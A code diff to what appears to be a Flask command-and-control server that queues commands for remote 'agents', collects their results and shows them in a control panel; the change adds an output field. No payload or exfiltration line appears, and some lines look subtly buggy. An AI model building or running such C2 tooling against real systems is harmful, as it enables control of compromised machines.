@@ -31,6 +31,7 @@ class Task(db.Model):
     status = db.Column(db.String)
     agent_id = db.Column(db.String)
     arguments = db.Column(db.String)
+    output = db.Column(db.String)
 
 def find_agent_by_id(id_):
     return Agent.query.filter_by(agent_id=id_).first()
@@ -40,7 +41,7 @@ def make_job_id():
 @app.route("/tasks/get-jobs")
 def get_jobs():
     tasks = Task.query.all()
-    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "command": i.cmd, "status": i.status, "arguments": i.arguments} for i in tasks]
+    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "command": i.cmd, "status": i.status, "arguments": i.arguments, "output": i.output} for i in tasks]
     return jsonify(t)
 
 @app.route("/tasks/create", methods=["POST"])
@@ -54,6 +55,7 @@ def create_task():
     task_command = data.get("cmd")
     agent_id = data.get("agent_id")
     arguments = data.get("arguments")
+    output = data.get("output")
 
     agent = find_agent_by_id(agent_id)
     if agent == None:
@@ -64,18 +66,19 @@ def create_task():
         cmd = task_command,
         status=CREATED,
         agent_id= agent_id,
-        arguments=arguments
+        arguments=arguments,
+        output=output
     )
     db.session.add(task)
     db.session.commit()
     print(f"[+] A new task has been created for {agent_id}")
-    t = [{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments": arguments, "status": TASKED}]
+    t = [{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments": arguments, "status": TASKED, "output": output}]
     return jsonify(t)
 
 @app.route("/tasks/list", methods=["GET"])
 def list_tasks():
     tasks = Task.query.all()
-    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.status, "command": i.cmd, "arguments": i.arguments} for i in tasks]
+    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.status, "command": i.cmd, "arguments": i.arguments, "output": i.output} for i in tasks]
 
     return render_template(
         'controlCenter.html',
@@ -105,6 +108,7 @@ def tasking():
             else:
                 print(f"[+] Agent responded to job {t_job_id} with result: {t_job_resp}" )
                 task.status = DONE
+                task.output = output
                 db.session.commit()
 
             # we need to set the task to compiled
@@ -135,12 +139,13 @@ def tasking():
         task.Status = TASKED
         db.session.commit()
         t = [{ "job_id": task.job_id, "agent_id":task.agent_id, "command":task.cmd, "status": DONE, "output": output}]
-        return t
+        return jsonify(t)
 
 
 @app.route("/output/list", methods=["GET"])
 def out_handler():
-    t = tasking()
+    t = Task.query.all()
+    print("t result: ", t)
     return render_template(
         'outPut.html',
         t=t
